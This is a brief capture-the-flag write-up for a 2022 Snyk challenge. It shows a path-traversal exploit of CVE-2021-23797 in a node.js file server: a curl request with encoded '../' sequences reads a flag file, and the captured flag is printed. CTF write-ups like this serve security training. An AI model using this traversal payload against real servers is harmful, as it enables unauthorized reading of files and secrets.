# 2022 Snyk - File Explorer

The web app showed public listing on http://file-explorer.c.ctf-snyk.io/public/.

Since the challenge description hinted at node.js we found about CVE-2021-23797, more info on Snyk VulnDB https://security.snyk.io/vuln/SNYK-JS-HTTPSERVERNODE-1727656.

Just replicating this gave us the ability to list and read files on the filesystem:
```
$ curl "http://file-explorer.c.ctf-snyk.io/public/..%2f..%2f..%2f..%2f../proc/self/cwd/flag"
SNYK{6854ecb17f23afdf2610f741dd07bd6099c616e4ac2a403eb14fa8689e1fb0af}
```

